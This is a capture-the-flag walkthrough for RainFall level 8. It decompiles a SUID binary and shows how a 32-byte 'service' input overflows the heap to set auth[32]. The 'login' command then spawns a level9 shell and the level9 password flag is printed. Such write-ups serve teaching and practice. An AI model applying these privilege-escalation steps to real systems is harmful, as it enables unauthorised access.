# Level 8 Walkthrough

In this level, we exploit a logic flaw in how heap memory is allocated and accessed to modify memory outside of its bounds. By doing so, we trick the program into calling `system("/bin/sh")` and gain access to the next user's shell. This challenge showcases the subtle power of heap-based logic bugs.

---

## Who am I?

Before diving into the binary’s behavior, we identify our current user context to confirm the environment:

```bash
level8@RainFall:~$ id
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
```

## Where am I?

Let’s explore the directory to see what we’re working with:

```bash
level8@RainFall:~$ ls -l
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8*
```

We find a SUID binary owned by `level9`. Our mission is to exploit this binary in order to retrieve the contents of `/home/user/level9/.pass`.

---

## Binary Behavior

We begin by launching the binary to get an idea of its runtime behavior:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
```

The program displays two `NULL` pointers followed by a prompt for user input. At this stage, the purpose of these pointers is unknown. We suspect they relate to internal state, but need further inspection.

To get a clearer picture, we reverse-engineered the binary using Ghidra. Here is the decompiled `main()` function:

```c
undefined4 main(void)
{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  char *pcVar4;
  int iVar5;
  uint uVar6;
  byte *pbVar7;
  byte *pbVar8;
  bool bVar9;
  undefined1 uVar10;
  undefined1 uVar11;
  bool bVar12;
  undefined1 uVar13;
  byte bVar14;
  byte local_90 [5];
  char local_8b [2];
  char acStack_89 [125];

  bVar14 = 0;
  do {
    printf("%p, %p \n",auth,service);
    pcVar4 = fgets((char *)local_90,0x80,stdin);
    ...
```

The function is quite long, but the key logic revolves around parsing commands like `auth`, `reset`, `service`, and `login`. We identified that the two `NULL` pointers displayed at the beginning correspond to two global variables: `auth` and `service`. These are manipulated by the commands the user types.

For clarity, here is a simplified version of the control flow:

```c
if (strncmp(input, "auth", 5) == 0) {
    auth = malloc(4);
    memset(auth, 0, 4);
    if (strlen(input + 5) < 31) {
        strcpy(auth, input + 5);
    }
}

if (strncmp(input, "reset", 5) == 0) {
    free(auth);
}

if (strncmp(input, "service", 7) == 0) {
    service = strdup(input + 7);
}

if (strncmp(input, "login", 5) == 0) {
    if (*(auth + 32) != 0) {
        system("/bin/sh");
    } else {
        fwrite("Password:\n", 1, 10, stdout);
    }
}
```

Now that we have a clearer understanding of the program logic, we can reason through a potential path to exploitation.

---

## Understanding the Exploit

Let’s break down the goal and how we can manipulate the program to reach it.

### Objective

The critical condition is:

```c
if (*(auth + 32) != 0)
```

This tests whether the **33rd byte** of `auth` (i.e., `auth[32]`) is non-zero. If it is, the program spawns a shell with `system("/bin/sh")`.

### Vulnerability

Here’s the key:

* `auth` is allocated with only **4 bytes**, and initialized to zero.
* The `service` buffer is created using `strdup()`, which copies user input into a new allocation placed **after** `auth` on the heap.
* A long input to `service` allows us to **overwrite adjacent memory**, including `auth[32]`.

So, if we can write 32 bytes into `service`, we can overflow into `auth[32]` and set it to a non-zero value, which triggers the shell when calling `login`.

### Important Detail

However, there’s a condition on the `auth` command: it only performs `strcpy()` if the string after `auth` is less than 31 characters. If this condition is not met, `auth` remains `NULL`. Then, the program crashes when trying to read from `auth[32]`.

So to proceed safely:

* The string after `auth` must be short (e.g., `test`)
* The string after `service` must be at least 32 characters to reach `auth[32]`

---

## Crafting the Exploit Step-by-Step

We now test the exploit step by step, applying what we just reasoned about.

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
```

🔹 At this point, both `auth` and `service` are `NULL`. No memory has been allocated yet.

---

```bash
auth test
0x804a008, (nil)
```

🔹 This creates a 4-byte `auth` buffer on the heap (at address `0x804a008`). The string `"test"` is copied into it. Since the input is less than 31 characters, the `strcpy()` executes correctly.

Memory layout:

```bash
0x804a008 : 't'
0x804a009 : 'e'
0x804a00A : 's'
0x804a00B : 't'
```

---

```bash
service $(python -c 'print("A"*32)')
0x804a008, 0x804a018
```

🔹 The program allocates a new buffer for `service` at `0x804a018` and copies 32 `A` into it. Because the chunk is right after `auth`, this overflows into the next chunk, touching `auth[32]`.

Visualisation mémoire (simplifiée) :

```bash
...    <- auth (4 bytes) at 0x804a008
...
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <- service (32 A) at 0x804a018
^ overflows to byte 33 of auth (auth[32])
```

This means: `auth[32] = 'A'` → so `*(auth + 32) != 0`.

---

```bash
login
```

🔹 The program checks `auth[32]`, sees that it’s non-zero (`'A'` = `0x41`), and calls `system("/bin/sh")`.

We now have a shell:

```bash
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Exploit succeeded.

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `asm_analysis.md`: GDB analysis of the binary
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)

---

## Conclusion

This level highlights a subtle but powerful logic flaw in heap memory handling:

* By overflowing memory allocated after `auth`, we modify `auth[32]` indirectly
* This causes the condition in `login` to trigger `system("/bin/sh")`

Through a simple abuse of heap layout and input length, we obtain a shell as `level9` and access the protected flag.

